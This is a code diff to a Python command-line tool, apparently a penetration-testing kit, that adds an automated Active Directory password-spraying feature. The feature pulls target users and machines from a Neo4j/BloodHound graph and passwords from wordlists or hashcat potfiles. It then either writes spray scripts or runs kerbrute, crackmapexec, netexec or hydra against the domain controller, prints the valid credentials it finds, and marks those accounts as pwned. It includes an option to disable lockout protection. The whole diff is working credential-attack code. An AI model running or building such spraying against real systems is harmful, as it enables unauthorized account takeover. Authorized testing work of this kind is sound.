@@ -463,6 +463,75 @@ Supported Edge Types:
         help="Output file for tailored spray report (default: spray_tailored.md in current dir)",
     )
 
+    # Auto-spray arguments
+    spray_group.add_argument(
+        "--auto-spray",
+        action="store_true",
+        help="Generate auto-spray scripts (default) or execute with --execute flag",
+    )
+    spray_group.add_argument(
+        "--execute",
+        action="store_true",
+        help="Execute spray commands automatically (requires --auto-spray). Default: generate scripts only",
+    )
+    spray_group.add_argument(
+        "--spray-tool",
+        type=str,
+        choices=["kerbrute", "crackmapexec", "netexec", "hydra", "auto"],
+        default="auto",
+        help="Spray tool to use. 'auto' selects best available (default: auto)",
+    )
+    spray_group.add_argument(
+        "--cred-source",
+        type=str,
+        action="append",
+        choices=["neo4j", "potfile", "wordlist"],
+        metavar="SOURCE",
+        help="Credential sources: neo4j, potfile, wordlist (can specify multiple)",
+    )
+    spray_group.add_argument(
+        "--wordlist",
+        type=Path,
+        metavar="FILE",
+        help="Custom password wordlist file (use with --cred-source wordlist)",
+    )
+    spray_group.add_argument(
+        "--potfile",
+        type=Path,
+        metavar="FILE",
+        help="Custom potfile path (default: ~/.local/share/hashcat/hashcat.potfile)",
+    )
+    spray_group.add_argument(
+        "--spray-users",
+        type=str,
+        choices=["all", "enabled", "non-pwned", "custom"],
+        default="enabled",
+        help="Users to target: 'all', 'enabled' (default), 'non-pwned', or 'custom' (with --user-file)",
+    )
+    spray_group.add_argument(
+        "--user-file",
+        type=Path,
+        metavar="FILE",
+        help="Custom user list file (use with --spray-users custom)",
+    )
+    spray_group.add_argument(
+        "--targets-file",
+        type=Path,
+        metavar="FILE",
+        help="Custom machine targets file (IPs/hostnames). Default: extract from Neo4j",
+    )
+    spray_group.add_argument(
+        "--no-lockout-protection",
+        action="store_true",
+        help="Disable lockout protection (DANGEROUS - use only in lab environments)",
+    )
+    spray_group.add_argument(
+        "--spray-output",
+        type=Path,
+        metavar="DIR",
+        help="Output directory for spray scripts/results (default: ./spray_output/)",
+    )
+
     return parser
 
 
@@ -1962,6 +2031,319 @@ def handle_spray_tailored(args):
         tracker.close()
 
 
+def handle_auto_spray(args):
+    """Handle --auto-spray command - generate or execute spray operations."""
+    from .autospray import (
+        SprayExecutor,
+        CredentialManager,
+        LockoutManager,
+        ScriptGenerator,
+        Neo4jCredentialSource,
+        WordlistSource,
+        PotfileSource,
+        TargetManager,
+        Neo4jUserSource,
+        Neo4jMachineSource,
+        FileTargetSource,
+    )
+    from .autospray.executor import SprayTool, ToolNotFoundError
+
+    config = Neo4jConfig(uri=args.uri, user=args.user, password=args.password)
+    tracker = PwnedTracker(config)
+
+    if not tracker.connect():
+        print("[!] Could not connect to Neo4j")
+        return 1
+
+    try:
+        # Get domain configuration
+        domain_config = tracker.get_domain_config()
+        domain = domain_config.get("domain", "") if domain_config else ""
+        dc_ip = domain_config.get("dc_ip") if domain_config else None
+
+        if not dc_ip:
+            print("[!] DC IP not configured. Set it with: crack bt --dc-ip <IP>")
+            return 1
+
+        if not domain:
+            print("[!] Domain not configured. Set it with: crack bt --domain <DOMAIN>")
+            return 1
+
+        print(f"[*] Domain: {domain}")
+        print(f"[*] DC IP: {dc_ip}")
+        print()
+
+        # Initialize credential manager
+        cred_manager = CredentialManager()
+
+        # Add requested credential sources (default: neo4j)
+        sources = args.cred_source or ["neo4j"]
+
+        if "neo4j" in sources:
+            cred_manager.add_source(Neo4jCredentialSource(config))
+        if "wordlist" in sources:
+            if not args.wordlist:
+                print("[!] --wordlist required when using --cred-source wordlist")
+                return 1
+            cred_manager.add_source(WordlistSource(args.wordlist))
+        if "potfile" in sources:
+            cred_manager.add_source(PotfileSource(args.potfile))
+
+        # Get passwords (optional - commands will use placeholders if empty)
+        passwords = cred_manager.get_passwords_for_spray()
+
+        if passwords:
+            print(f"[+] Loaded {len(passwords)} passwords from {len(sources)} source(s)")
+        else:
+            print("[*] No passwords found - commands will use <PASSWORD> placeholders")
+            stats = cred_manager.get_statistics()
+            print(f"    Sources checked: {stats['sources_available'] or ['none']}")
+
+        # Initialize target manager
+        target_manager = TargetManager()
+
+        # Add user sources
+        user_filter = getattr(args, 'spray_users', 'enabled')
+        if user_filter == "custom" and args.user_file:
+            target_manager.add_user_source(FileTargetSource(args.user_file, "user"))
+        else:
+            target_manager.add_user_source(Neo4jUserSource(config, user_filter))
+
+        # Add machine sources
+        if args.targets_file:
+            target_manager.add_machine_source(FileTargetSource(args.targets_file, "machine"))
+        else:
+            target_manager.add_machine_source(Neo4jMachineSource(config))
+
+        # Get targets
+        users = target_manager.get_users()
+        machines = target_manager.get_machines()
+
+        if not users:
+            print("[!] No target users found")
+            return 1
+
+        print(f"[+] Targeting {len(users)} users")
+        if machines:
+            print(f"[+] Targeting {len(machines)} machines")
+        print()
+
+        # Get password policy
+        policy = tracker.get_password_policy()
+
+        # Initialize lockout manager
+        lockout_mgr = LockoutManager(
+            policy=policy,
+            override_mode=args.no_lockout_protection,
+        )
+
+        # Display spray plan (only if we have passwords)
+        if passwords:
+            print(lockout_mgr.format_plan_display(passwords, len(users)))
+            print()
+
+        # Determine tool
+        spray_tool = None
+        if args.spray_tool and args.spray_tool != "auto":
+            tool_map = {
+                "kerbrute": SprayTool.KERBRUTE,
+                "crackmapexec": SprayTool.CRACKMAPEXEC,
+                "netexec": SprayTool.NETEXEC,
+                "hydra": SprayTool.HYDRA,
+            }
+            spray_tool = tool_map.get(args.spray_tool)
+
+        if args.execute:
+            # Execute mode - run spray with real-time output
+            return _execute_auto_spray(
+                args, tracker, domain, dc_ip, users, passwords,
+                lockout_mgr, spray_tool, machines
+            )
+        else:
+            # Default: Generate scripts for review
+            return _generate_spray_scripts(
+                args, domain, dc_ip, users, passwords, lockout_mgr, machines
+            )
+
+    finally:
+        tracker.close()
+
+
+def _get_spray_users(tracker, args) -> list:
+    """Get target users based on --spray-users option. (Deprecated - use TargetManager)"""
+    user_mode = getattr(args, 'spray_users', 'enabled')
+
+    if user_mode == "custom":
+        if not args.user_file:
+            print("[!] --user-file required when using --spray-users custom")
+            return []
+        try:
+            with open(args.user_file, 'r') as f:
+                return [line.strip() for line in f if line.strip()]
+        except Exception as e:
+            print(f"[!] Failed to read user file: {e}")
+            return []
+
+    elif user_mode == "all":
+        return tracker.get_all_users()
+    elif user_mode == "non-pwned":
+        return tracker.get_non_pwned_users()
+    else:  # enabled (default)
+        return tracker.get_enabled_users()
+
+
+def _execute_auto_spray(args, tracker, domain, dc_ip, users, passwords, lockout_mgr, spray_tool, machines=None):
+    """Execute spray with real-time output."""
+    from .autospray import SprayExecutor
+    from .autospray.executor import ToolNotFoundError
+
+    machines = machines or []
+
+    # Confirmation prompt
+    print("=" * 60)
+    print("  AUTO-SPRAY EXECUTION CONFIRMATION")
+    print("=" * 60)
+    print()
+    print(f"  Target Users:     {len(users)} accounts")
+    print(f"  Target Machines:  {len(machines)} hosts" if machines else "  Target Machines:  DC only")
+    print(f"  Passwords:        {len(passwords)} unique passwords")
+    print(f"  DC Target:        {dc_ip}")
+    print()
+
+    if lockout_mgr.has_policy:
+        print(f"  Lockout threshold: {lockout_mgr.lockout_threshold} attempts")
+        print(f"  Safe per round:    {lockout_mgr.safe_attempts}")
+    elif args.no_lockout_protection:
+        print("  WARNING: Lockout protection DISABLED")
+    else:
+        print("  WARNING: No lockout policy detected")
+
+    print()
+    confirm = input("  Type 'SPRAY' to confirm: ")
+
+    if confirm != "SPRAY":
+        print("[!] Aborted")
+        return 1
+
+    print()
+    print("[*] Starting spray...")
+    print()
+
+    try:
+        with SprayExecutor(
+            tool=spray_tool,
+            domain=domain,
+            dc_ip=dc_ip,
+            verbose=True,
+        ) as executor:
+            tool_name = executor.get_tool().value
+            print(f"[*] Using tool: {tool_name}")
+            print()
+
+            all_results = []
+
+            def progress_cb(current, total, status):
+                print(f"\r[{current}/{total}] {status}    ", end="", flush=True)
+
+            def result_cb(result):
+                if result.success:
+                    for r in result.results:
+                        admin = " [ADMIN]" if r.is_admin else ""
+                        print(f"\n[+] VALID: {r.username}:{r.password}{admin}")
+
+            results = executor.spray_with_plan(
+                users=users,
+                passwords=passwords,
+                lockout_manager=lockout_mgr,
+                progress_callback=progress_cb,
+                result_callback=result_cb,
+            )
+
+            all_results.extend(results)
+
+        # Summary
+        print()
+        print()
+        print("=" * 60)
+        print("  SPRAY COMPLETE")
+        print("=" * 60)
+        print()
+
+        valid_creds = [r for result in all_results for r in result.results]
+        admin_creds = [r for r in valid_creds if r.is_admin]
+
+        print(f"  Valid credentials: {len(valid_creds)}")
+        print(f"  Admin access:      {len(admin_creds)}")
+        print()
+
+        if valid_creds:
+            print("  Credentials found:")
+            for r in valid_creds:
+                admin = " (ADMIN)" if r.is_admin else ""
+                print(f"    {r.username}:{r.password}{admin}")
+            print()
+
+            # Mark pwned in Neo4j
+            print("[*] Marking users as pwned in Neo4j...")
+            marked = tracker.mark_pwned_batch([
+                {"username": r.username, "password": r.password, "is_admin": r.is_admin}
+                for r in valid_creds
+            ])
+            print(f"[+] Marked {marked} users as pwned")
+
+        return 0
+
+    except ToolNotFoundError as e:
+        print(f"[!] {e}")
+        return 1
+    except Exception as e:
+        print(f"[!] Spray failed: {e}")
+        return 1
+
+
+def _generate_spray_scripts(args, domain, dc_ip, users, passwords, lockout_mgr, machines=None):
+    """Generate spray scripts for manual review."""
+    from .autospray import ScriptGenerator
+
+    machines = machines or []
+    output_dir = args.spray_output or Path("./spray_output")
+    tool = args.spray_tool if args.spray_tool != "auto" else "crackmapexec"
+
+    generator = ScriptGenerator(
+        domain=domain,
+        dc_ip=dc_ip,
+        output_dir=output_dir,
+        tool=tool,
+    )
+
+    print(f"[*] Generating spray scripts with {tool}...")
+
+    result = generator.generate_spray_script(
+        users=users,
+        passwords=passwords,
+        lockout_manager=lockout_mgr,
+        machines=machines,
+    )
+
+    # Print the commands file content to console
+    commands_file = output_dir / "spray_commands.txt"
+    if commands_file.exists():
+        print()
+        print(commands_file.read_text())
+
+    # Show file locations
+    print()
+    print(f"[+] Files saved to: {output_dir}/")
+    print(f"    users.txt      - {len(users)} target users")
+    if machines:
+        print(f"    targets.txt    - {len(machines)} target machines")
+    if passwords:
+        print(f"    passwords.txt  - {len(passwords)} passwords")
+        print(f"    spray.sh       - Executable spray script")
+
+    return 0
+
+
 def main():
     parser = create_parser()
     args = parser.parse_args()
@@ -2098,6 +2480,10 @@ def main():
     # Handle tailored spray command
     if args.spray_tailored:
         return handle_spray_tailored(args)
+
+    # Handle auto-spray command
+    if args.auto_spray:
+        return handle_auto_spray(args)
 
     # Handle --dc-ip as standalone config setter (when no data directory provided)
     if args.dc_ip and (not hasattr(args, 'bh_data_dir') or args.bh_data_dir is None):
